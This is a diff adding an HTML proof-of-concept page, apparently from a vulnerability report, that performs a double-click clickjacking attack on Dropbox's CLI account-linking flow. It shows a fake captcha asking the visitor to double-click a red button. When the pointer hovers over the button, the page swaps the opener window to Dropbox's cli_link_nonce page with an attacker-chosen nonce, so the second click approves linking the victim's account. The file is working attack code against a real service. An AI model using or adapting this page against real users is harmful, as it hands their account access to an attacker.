@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>POC</title>
+</head>
+
+<body>
+
+  <script>
+    (() => {
+      const searchParams = new URLSearchParams(window.location.search);
+      const nonce = searchParams.get('nonce');
+      if (!nonce) {
+        alert('nonce is required');
+        return;
+      }
+      const step = searchParams.get('step') || '1';
+      const step2URL = '?' + new URLSearchParams({ step: 2, nonce: nonce }).toString();
+      const step3URL = '?' + new URLSearchParams({ step: 3, nonce: nonce }).toString();
+
+      if (step === '1') {
+        const button = document.createElement('button');
+        button.innerText = 'click here';
+        button.onclick = () => {
+          const window2 = window.open(step2URL, '_blank');
+
+          // Listen for step3 close
+          window.onstorage = (event) => {
+            if (event.key === 'step3-close') {
+              setTimeout(() => {
+                window2.close();
+              }, 10); // TODO: shorten timeout
+            }
+          };
+        };
+        document.body.appendChild(button);
+      } else if (step === '2') {
+        const button = document.createElement('button');
+        button.innerText = 'click here';
+        button.onclick = () => {
+          window.open(step3URL, '_blank');
+        };
+        document.body.appendChild(button);
+      } else if (step === '3') {
+        document.body.innerText = 'Captcha: double-click the red button to prove you are human';
+        const button = document.createElement('button');
+        const x = 700;
+        const y = 275;
+        const width = 50;
+        const height = 18;
+        button.style.position = 'absolute';
+        button.style.left = x + 'px';
+        button.style.top = y + 'px';
+        button.style.width = width + 'px';
+        button.style.height = height + 'px';
+        button.style.backgroundColor = 'red';
+        button.onclick = () => {
+          localStorage.setItem('step3-close', Math.random().toString());
+          window.close();
+        };
+        const stage = () => {
+          opener.location = 'https://www.dropbox.com/cli_link_nonce?' + new URLSearchParams({ nonce: nonce }).toString();
+        };
+        const unstage = () => {
+          opener.location = step2URL;
+        };
+        button.onmouseenter = stage;
+        button.onmouseleave = unstage;
+        window.onblur = unstage;
+        document.body.appendChild(button);
+      }
+    })();
+  </script>
+</body>
+
+</html>
